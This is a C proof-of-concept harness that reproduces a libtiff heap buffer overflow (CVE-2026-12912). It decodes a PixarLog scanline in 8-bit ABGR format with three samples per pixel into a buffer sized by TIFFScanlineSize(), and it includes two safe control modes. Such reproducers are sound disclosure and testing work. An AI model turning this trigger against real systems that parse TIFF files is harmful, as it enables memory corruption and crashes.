/*
 * Self-contained reproducer for CVE-2026-12912 / GHSA-cg4c-j43f-qcg7.
 *
 * Usage: harness <abgr3|rgb3|abgr4> <output-tiff-path>
 *
 * Creates a one-row PixarLog-compressed TIFF, reopens it, selects the
 * requested PixarLog user data format, allocates exactly TIFFScanlineSize()
 * bytes (as documented for TIFFReadScanline) and decodes one scanline.
 *
 * abgr3: SamplesPerPixel=3, PIXARLOGDATAFMT_8BITABGR (vulnerable path)
 * rgb3:  SamplesPerPixel=3, PIXARLOGDATAFMT_8BIT (safe control)
 * abgr4: SamplesPerPixel=4, PIXARLOGDATAFMT_8BITABGR (safe control)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "tiffio.h"

#define WIDTH 64
#define ROWS 1

int main(int argc, char **argv)
{
    const char *mode;
    const char *path;
    uint16_t spp;
    int user_fmt;
    unsigned char row[WIDTH * 4];
    unsigned char *buf;
    TIFF *tif;
    tmsize_t scanline_size;
    int read_rc;

    if (argc != 3)
    {
        fprintf(stderr, "usage: %s <abgr3|rgb3|abgr4> <tif-path>\n", argv[0]);
        return 2;
    }
    mode = argv[1];
    path = argv[2];

    if (strcmp(mode, "abgr3") == 0)
    {
        spp = 3;
        user_fmt = PIXARLOGDATAFMT_8BITABGR;
    }
    else if (strcmp(mode, "rgb3") == 0)
    {
        spp = 3;
        user_fmt = PIXARLOGDATAFMT_8BIT;
    }
    else if (strcmp(mode, "abgr4") == 0)
    {
        spp = 4;
        user_fmt = PIXARLOGDATAFMT_8BITABGR;
    }
    else
    {
        fprintf(stderr, "unknown mode: %s\n", mode);
        return 2;
    }

    for (unsigned i = 0; i < WIDTH * spp; ++i)
        row[i] = (unsigned char)(i * 37 + 11);

    tif = TIFFOpen(path, "w");
    if (tif == NULL)
    {
        fprintf(stderr, "TIFFOpen(write) failed\n");
        return 2;
    }
    if (!TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, (uint32_t)WIDTH) ||
        !TIFFSetField(tif, TIFFTAG_IMAGELENGTH, (uint32_t)ROWS) ||
        !TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, (uint16_t)8) ||
        !TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, spp) ||
        !TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_RGB) ||
        !TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG) ||
        !TIFFSetField(tif, TIFFTAG_SAMPLEFORMAT, SAMPLEFORMAT_UINT) ||
        !TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_PIXARLOG) ||
        !TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, (uint32_t)ROWS) ||
        TIFFWriteScanline(tif, row, 0, 0) < 0)
    {
        fprintf(stderr, "TIFF writer setup failed\n");
        TIFFClose(tif);
        return 2;
    }
    TIFFClose(tif);

    tif = TIFFOpen(path, "r");
    if (tif == NULL)
    {
        fprintf(stderr, "TIFFOpen(read) failed\n");
        return 2;
    }
    if (!TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, user_fmt))
    {
        fprintf(stderr, "TIFFSetField(PIXARLOGDATAFMT) failed\n");
        TIFFClose(tif);
        return 2;
    }

    scanline_size = TIFFScanlineSize(tif);
    printf("MODE=%s WIDTH=%d SPP=%u DATAFMT=%d TIFF_SCANLINE_SIZE=%ld\n",
           mode, WIDTH, (unsigned)spp, user_fmt, (long)scanline_size);
    fflush(stdout);

    if (scanline_size <= 0)
    {
        fprintf(stderr, "bad TIFFScanlineSize\n");
        TIFFClose(tif);
        return 2;
    }
    buf = (unsigned char *)malloc((size_t)scanline_size);
    if (buf == NULL)
    {
        fprintf(stderr, "malloc failed\n");
        TIFFClose(tif);
        return 2;
    }
    memset(buf, 0xA5, (size_t)scanline_size);

    read_rc = TIFFReadScanline(tif, buf, 0, 0);
    printf("TIFF_READ_SCANLINE_RC=%d EXPECTED_DECODE_BYTES=%d\n",
           read_rc, WIDTH * (user_fmt == PIXARLOGDATAFMT_8BITABGR ? 4 : (int)spp));
    fflush(stdout);

    free(buf);
    TIFFClose(tif);
    return 0;
}
